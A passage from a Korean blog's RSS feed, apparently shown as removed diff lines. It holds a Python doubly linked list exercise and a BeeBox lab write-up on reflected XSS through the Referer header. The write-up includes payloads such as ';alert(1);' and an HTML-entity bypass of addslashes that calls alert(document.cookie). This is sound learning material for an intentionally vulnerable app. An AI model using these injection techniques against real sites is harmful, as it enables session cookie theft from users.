class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LinkedList_ex3 <span class="keyword">import</span> Node</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubleNode</span>(<span class="params">Node</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Double Linked List&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data, back=<span class="literal">None</span>, <span class="built_in">next</span>=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(data, <span class="built_in">next</span>)</span><br><span class="line">        self.back = back</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubleNodeMgmt</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Double Linked List Management&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        self.head = DoubleNode(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># head가 없으면 head 지정</span></span><br><span class="line">        <span class="keyword">if</span> self.head == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            self.head = DoubleNode(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node = self.head</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> node.<span class="built_in">next</span>:</span><br><span class="line">                node = node.<span class="built_in">next</span></span><br><span class="line">            </span><br><span class="line">            node.<span class="built_in">next</span> = DoubleNode(data)</span><br><span class="line">            node.<span class="built_in">next</span>.back = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.head == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            print(<span class="string">&#x27;Node가 없습니다.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.head.data == data:</span><br><span class="line">            temp = self.head</span><br><span class="line">            self.head = self.head.<span class="built_in">next</span></span><br><span class="line">            self.head.back = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">del</span> temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node = self.head</span><br><span class="line">            <span class="keyword">while</span> node.<span class="built_in">next</span>:</span><br><span class="line">                <span class="keyword">if</span> node.<span class="built_in">next</span>.data == data:</span><br><span class="line">                    temp = node.<span class="built_in">next</span></span><br><span class="line">                    node.<span class="built_in">next</span> = node.<span class="built_in">next</span>.<span class="built_in">next</span></span><br><span class="line">                    node.<span class="built_in">next</span>.back = node</span><br><span class="line">                    <span class="keyword">del</span> temp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    node = node.<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">front_desc</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;--- Front Desc ---&#x27;</span>)</span><br><span class="line">        node = self.head</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> node.<span class="built_in">next</span>:</span><br><span class="line">            print(node.data, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            node = node.<span class="built_in">next</span></span><br><span class="line">        print(node.data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_desc</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;---End Desc---&#x27;</span>)</span><br><span class="line">        node = self.head</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> node.<span class="built_in">next</span>:</span><br><span class="line">            node = node.<span class="built_in">next</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> node.back:</span><br><span class="line">            print(node.data, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            node = node.back</span><br><span class="line">        </span><br><span class="line">        print(node.data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dnl = DoubleNodeMgmt(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>):</span><br><span class="line">        dnl.add(_)</span><br><span class="line"></span><br><span class="line">    dnl.front_desc()</span><br><span class="line"></span><br><span class="line">    dnl.delete(<span class="number">3</span>)</span><br><span class="line">    dnl.front_desc()</span><br><span class="line">    dnl.end_desc()</span><br></pre></td></tr></table></figure><figure class="highlight zsh"><figcaption><span>출력</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--- Front Desc ---</span><br><span class="line">1 2 3 4 5 6 7 8 9</span><br><span class="line">--- Front Desc ---</span><br><span class="line">1 2 4 5 6 7 8 9</span><br><span class="line">---End Desc---</span><br><span class="line">9 8 7 6 5 4 2 1</span><br></pre></td></tr></table></figure><p>전에 만들어 놓은 Linked List의 Node 클래스를 굳이 가지고 와서 Double Node를 구현하였다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Data-Structure/">Data Structure</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/Double-Linked-List/">Double Linked List</category>
-      
-      <category domain="https://lrtk-coder.github.io/tags/Linked-List/">Linked List</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/02/15/Data-Structure-Double-Linked-List-%EA%B5%AC%ED%98%84/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>XSS - Reflected (Back Button)</title>
-      <link>https://lrtk-coder.github.io/2021/02/15/XSS-Reflected-Back-Button/</link>
-      <guid>https://lrtk-coder.github.io/2021/02/15/XSS-Reflected-Back-Button/</guid>
-      <pubDate>Mon, 15 Feb 2021 14:06:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;문제풀이&quot;&gt;&lt;a href=&quot;#문제풀이&quot; class=&quot;headerlink&quot; title=&quot;문제풀이&quot;&gt;&lt;/a&gt;문제풀이&lt;/h1&gt;&lt;h2 id=&quot;Low&quot;&gt;&lt;a href=&quot;#Low&quot; class=&quot;headerlink&quot; title=&quot;Low&quot;&gt;&lt;/a&gt;Lo</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-170.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go back&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location.href=&#x27;http://xxx.xxx.xxx.xxx:xxx/portal.php&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Go back 버튼을 클릭 시 portal.php로 돌아감.</p><p>자세한 흐름을 알기 위해 해당 문제의 페이지로 Request를 하는 것을 burp suit를 이용하여 살펴보았다.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/xss_back_button.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.xxx.xxx.xxx:xxx</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://xxx.xxx.xxx.xxx:xxx/portal.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=2f9fqpk49iaolf6eqav1i3m7b2; security_level=0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>살펴보니 Referer라는 부분이 있었다.<br><br>Referer 해더는 현재 요청된 페이지의 링크 이전의 웹 페이지 주소를 포함하는 헤더이다.</p><p>이를 수정하여 alert창을 띄우도록 하겠다.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: &#x27;;alert(1);&#x27;</span><br></pre></td></tr></table></figure><p>해당 Referer는 Onclick에 들어가기 때문에 script 태그 사용을 안해도 된다.</p><p><img src="/images/pasted-171.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go back&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location.href=&#x27;&#x27;;alert(1);&#x27;&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Referer의 변조가 성공하였다.</p><hr><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>Low 레벨의 방법대로 했더니,</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go back&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location.href=&#x27;\&#x27;hihihi\&#x27;&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&#39;</code>가 이스케이프가 되었음. 아마 addslashes 함수로 처리했을거라 판단이 됨.<br><br>그럼 <code>&#39;</code>,<code>&quot;</code>,<code>\</code>,<code>NUL</code>은 Xss에 사용이 불가능하다.</p><p>addslashes 함수를 우회하기 위해 HTML entity Encoding를 사용하였다.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: &amp;#039;;alert(document.cookie);&amp;#039;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go back&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location.href=&#x27;&#x27;;alert(document.cookie);&#x27;&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-172.png"></p><p>Xss 성공함.</p><hr><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>Medium 레벨와 같은 방식으로 시도하였지만, 실패함.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go back&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location.href=&#x27;<span class="symbol">&amp;amp;</span>#039;;alert(document.cookie);<span class="symbol">&amp;amp;</span>#039;&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>htmlspecialchars 함수로 Referer 값을 이스케이프 했기 때문에 &amp;의 값이 HTML 엔티티로 변경되어 Xss이 실패함.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/BeeBox/">BeeBox</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/02/15/XSS-Reflected-Back-Button/#disqus_thread</comments>
       
     </item>
     
